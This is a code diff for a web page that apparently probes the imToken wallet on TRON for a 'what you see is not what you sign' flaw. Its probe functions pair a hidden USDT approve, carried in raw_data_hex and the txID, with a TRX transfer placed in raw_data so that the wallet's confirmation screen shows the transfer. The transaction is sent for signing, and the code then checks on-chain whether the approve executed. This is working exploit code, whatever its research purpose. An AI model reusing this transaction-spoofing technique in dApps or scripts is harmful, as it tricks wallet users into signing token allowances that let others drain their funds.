+    $('allowanceCard').style.display = 'block';
+    if (init) {
+      initialAllowance = allowance;
+      $('allowanceChange').textContent = '初始值';
+    } else if (initialAllowance != null) {
+      const diff = allowance - initialAllowance;
+      if (diff > 0n) {
+        $('allowanceChange').textContent = '+' + formatAmount(diff);
+        $('allowanceChange').style.color = 'var(--red)';
+        log('⚠️ 授权额度增加！链上已执行 approve。', 'error');
+      } else {
+        $('allowanceChange').textContent = '无变化';
+      }
+    }
+  }
+
+  // 发送交易
+  async function sendTx(tx, desc) {
+    log(`发送 ${desc} …`, 'warn');
+    // 打印交易关键信息用于调试
+    const firstContract = tx.raw_data?.contract?.[0];
+    log('TX contract 键顺序: ' + Object.keys(firstContract || {}).join(' → '), 'warn');
+    log('TX raw_data.contract: ' + JSON.stringify(firstContract), 'warn');
+    log('TX raw_data_hex 前64字节: ' + (tx.raw_data_hex || '').slice(0, 64), 'warn');
+    const shapeProblems = validateBridgeTxShape(tx);
+    if (shapeProblems.length) {
+      log('已阻止调用 imToken 原生桥: ' + shapeProblems.join('；'), 'error');
+      log('该结构不是标准 TRON 交易，钱包确认页可能因解引用缺失字段而退出', 'error');
+      return false;
+    }
+    try {
+      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+        tx, from: walletAddr, useTronHeader: true
+      });
+      log('原始返回: ' + JSON.stringify(res), 'warn');
+      const rid = findTxId(res);
+      if (rid) {
+        log('✅ 交易已广播! TXID: ' + rid, 'success');
+        log('Tronscan: https://tronscan.org/#/transaction/' + rid, 'info');
+        return true;
+      } else if (res?.result === true || res === true) {
+        log('接口仅返回 result=true，未返回 64 位 TXID，不能据此确认广播成功', 'warn');
+        return false;
+      } else {
+        log('未返回有效的 64 位 TXID，不能确认广播成功', 'error');
+        return false;
+      }
+    } catch (e) {
+      const message = String(e?.message || '');
+      const code = String(e?.code || e?.data?.code || '');
+      const normalized = (code + ' ' + message).toLowerCase();
+      log('错误 message: ' + message, 'error');
+      log('错误 code: ' + (code || 'N/A'), 'error');
+      log('完整错误: ' + JSON.stringify(e, Object.getOwnPropertyNames(e)), 'error');
+      if (normalized.includes('user_rejected') || normalized.includes('reject')) {
+        log('→ 用户在钱包弹窗取消', 'warn');
+      } else if (normalized.includes('contract_validate_error') || message.includes('合约调用校验错误')) {
+        log('→ CONTRACT_VALIDATE_ERROR：合约/参数校验失败，不等同于 SIGERROR', 'error');
+      } else if (normalized.includes('sigerror') || normalized.includes('validate signature')) {
+        log('→ SIGERROR：签名与节点重建出的 raw_data 不一致，或签名权限不匹配', 'error');
+      } else if (normalized.includes('invalid_tx') || normalized.includes('validrawtx')) {
+        log('→ imToken 桥接层校验拦截 (validRawTx)', 'error');
+      } else if (normalized.includes('server')) {
+        log('→ 服务端返回错误，但当前信息不足以判定为签名错误', 'error');
+      }
+      return false;
+    }
+  }
+
+  // ① 普通 TRX 转账
+  async function normalTrx() {
+    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    log('构造普通 TRX 转账…', 'warn');
+    try {
+      const tx = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      log('构造成功', 'success');
+      await sendTx(tx, '普通 TRX 转账');
+    } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
+  }
+
+  // ② 原始 USDT approve
+  async function originalApprove() {
+    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    log('构造原始 approve…', 'warn');
+    try {
+      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      const userHex = window.tronWeb.address.toHex(walletAddr);
+      const { transaction, result } = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100_000_000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!result?.result) { log('生成失败', 'error'); return; }
+      log('原始 approve 构造成功', 'success');
+      await sendTx(transaction, '原始 USDT approve');
+    } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
+  }
+
+  // ③ hex/json 不一致探针（简洁版）
+  // raw_data_hex / txID 锚定 approve（签名+执行权威），raw_data.contract 替换为 TransferContract（UI 显示）
+  // 经 imToken 签名广播；若成功上链，回链查 contract.type 判定实际执行类型
+  async function mixedTx() {
+    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+    log('━━━━ hex/json 不一致探针 ━━━━', 'warn');
+    try {
+      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      const userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // 执行层：标准 approve（决定 txID + raw_data_hex + 签名锚定）
+      const built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100_000_000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result?.result) { log('approve 构造失败', 'error'); return; }
+      const approveTx = built.transaction;
+
+      // 显示层：真实 TransferContract（字段完整，UI 可正常解析）
+      const transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      const transferContract = transferBuilt.raw_data.contract[0];
+
+      // 组装：hex/txID=approve，contract=transfer
+      const submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [transferContract] }),
+        raw_data_hex: approveTx.raw_data_hex
+      };
+
+      log(`[执行层] txID=${approveTx.txID}`, 'warn');
+      log(`[显示层] contract.type=${transferContract.type}（UI 预期：TRX 转账 0.1）`, 'warn');
+      log(`[签名] raw_data_hex 含 approve 选择器: ${approveTx.raw_data_hex.includes('095ea7b3')}`, 'success');
+      log('━━━━━━━━━━━━━━━━━━━━', 'warn');
+
+      const ok = await sendTx(submitTx, 'hex/json 不一致探针');
+      if (ok) {
+        // 广播后 12s 回链验证
+        setTimeout(async () => {
+          // 从 sendTx 日志里无法直接拿到 txid，这里先查 allowance 变化作为旁证
+          await refreshAllowanceUI(false);
+          log('⚠ 若授权额度增加 → 漏洞成立。完整回链验证请用⑤按钮', 'warn');
+        }, 12000);
+      } else {
+        log('⚠ 若未闪退且弹窗正常显示 → 桥接层接受了结构（结构合法）', 'warn');
+      }
+    } catch (e) {
+      log('构造失败: ' + (e.message || e), 'error');
+    }
+  }
+
+  // 回链查询某笔交易实际记录的合约类型（判定"执行层"到底是什么）
+  async function fetchOnchainType(txid) {
+    try {
+      const r = await fetch(TRON_API + '/wallet/gettransactionbyid', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ value: txid })
+      });
+      const d = await r.json();
+      return d?.raw_data?.contract?.[0]?.type || '';
+    } catch (e) { return ''; }
+  }
+  async function fetchOnchainTypeRetry(txid, tries) {
+    for (let i = 0; i < tries; i++) {
+      const t = await fetchOnchainType(txid);
+      if (t) return t;
+      await new Promise(r => setTimeout(r, 4000));
+    }
+    return '';
+  }
+
+  // ⑤ 所见非所签探针（修正版）
+  // 关键事实：节点验签与执行都锚定同一份 raw_data 的 protobuf 序列化，txID = sha256(raw_data)。
+  //   所以"直接广播一笔显示≠执行的交易"在节点层无法通过验签（raw_data 是 transfer 就执行 transfer，
+  //   数字键 / raw_data_hex 节点都不认）。真正能制造"显示≠执行"缝隙的，只有 imToken 客户端
+  //   是否信任 raw_data_hex。
+  // 因此本探针：raw_data_hex / txID 锚定 approve（执行+签名权威），raw_data.contract 叠加为真实
+  //   TransferContract（仅供 UI 显示），二者自洽到能产出有效签名；经 imToken 签名广播后回链查
+  //   contract.type 判定：
+  //     · TriggerSmartContract → imToken 以 hex 为准 → UI 转账 / 链上 approve → 漏洞成立
+  //     · TransferContract     → imToken 以 raw_data 为准 → 所见即所签 → 无此漏洞
+  async function directBroadcastTest() {
+    if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+    log('=== 所见非所签探针（修正版）===', 'warn');
+    try {
+      const contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      const userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // 1) 执行层（权威）：标准 approve —— 决定签名锚定与链上语义
+      const built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100_000_000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result?.result) { log('approve 构造失败', 'error'); return; }
+      const approveTx = built.transaction;
+      const hasSelector = approveTx.raw_data_hex.includes('095ea7b3');
+      log('执行层 approve txID = ' + approveTx.txID, 'warn');
+      log('raw_data_hex 含 approve 选择器 095ea7b3: ' + hasSelector, hasSelector ? 'success' : 'error');
+
+      // 2) 显示层：真实 TransferContract —— 字段完整，imToken UI 可正常解析（不会缺字段闪退）
+      const transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      const transferContract = transferBuilt.raw_data.contract[0];
+
+      // 3) 组装：执行层(hex/txID)=approve，显示层(contract)=transfer
+      const submitTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [transferContract] }),
+        raw_data_hex: approveTx.raw_data_hex
+      };
+      log('显示层 contract.type = ' + transferContract.type + '（UI 预期：转账）', 'warn');
+      log('执行层 raw_data_hex 前64 = ' + approveTx.raw_data_hex.slice(0, 64), 'warn');
+
+      // 4) 经 imToken 签名广播（结构合法、无数字键、字段完整 → 不触发桥接守卫，也不致闪退）
+      log('调用 imToken.tron.sendTransaction …', 'warn');
+      let res;
+      try {
+        res = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+          tx: submitTx, from: walletAddr, useTronHeader: true
+        });
+      } catch (e) {
+        const msg = String(e?.message || e);
+        log('imToken 返回错误: ' + msg, 'error');
+        if (/sigerror|validate signature/i.test(msg)) {
+          log('→ imToken 用 raw_data(transfer) 重算签名，与 approve 的 txID 不一致 → 该版本对 hex/json 做了一致性校验（有防护）', 'error');
+        } else if (/reject|user_rejected/i.test(msg)) {
+          log('→ 用户在弹窗取消', 'warn');
+        } else if (/contract_validate/i.test(msg)) {
+          log('→ CONTRACT_VALIDATE_ERROR：参数/余额/能量校验失败，非签名问题', 'error');
+        }
+        return;
+      }
+      log('imToken 原始返回: ' + JSON.stringify(res), 'warn');
+      const txid = findTxId(res);
+      if (!txid) {
+        log('未返回 64 位 txID，无法回链判定（imToken 可能仅返回 result，需手动查 Tronscan）', 'warn');
+        return;
+      }
+      log('✅ 已广播 txID = ' + txid, 'success');
+      log('Tronscan: https://tronscan.org/#/transaction/' + txid, 'info');
+
+      // 5) 回链判定执行层（节点实际记录的合约类型）
+      log('回链查询链上实际合约类型（最多 ~16s）…', 'warn');
+      const type = await fetchOnchainTypeRetry(txid, 4);
+      if (type === 'TriggerSmartContract') {
+        log('🔴 所见非所签确证：UI 显示转账(TransferContract)，链上实际执行 approve(TriggerSmartContract)', 'error');
+        await refreshAllowanceUI(false);
+      } else if (type === 'TransferContract') {
+        log('🟢 所见即所签：imToken 以 raw_data 为准，链上记录为转账，无此漏洞', 'success');
+      } else {
+        log('链上暂未确认该交易（可能尚未打包或被节点拒绝），可稍后点④手动查授权额度', 'warn');
+      }
+    } catch (e) {
+      log('探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
+  async function manualCheck() {
+    if (!walletAddr) return;
+    log('手动查询 allowance…', 'warn');
+    await refreshAllowanceUI(false);
+  }
+
+  $('btnConnect').addEventListener('click', connect);
+  $('btnNormal').addEventListener('click', normalTrx);
+  $('btnApprove').addEventListener('click', originalApprove);
+  $('btnMixed').addEventListener('click', mixedTx);
+  $('btnCheckAllowance').addEventListener('click', manualCheck);
+  $('btnDirectTest').addEventListener('click', directBroadcastTest);
+
+  if (hasBridge()) log('imToken 桥接环境就绪', 'success');
+  else log('请在 imToken DApp 浏览器中打开', 'warn');
+})();
 </script>
 </body>
 </html>
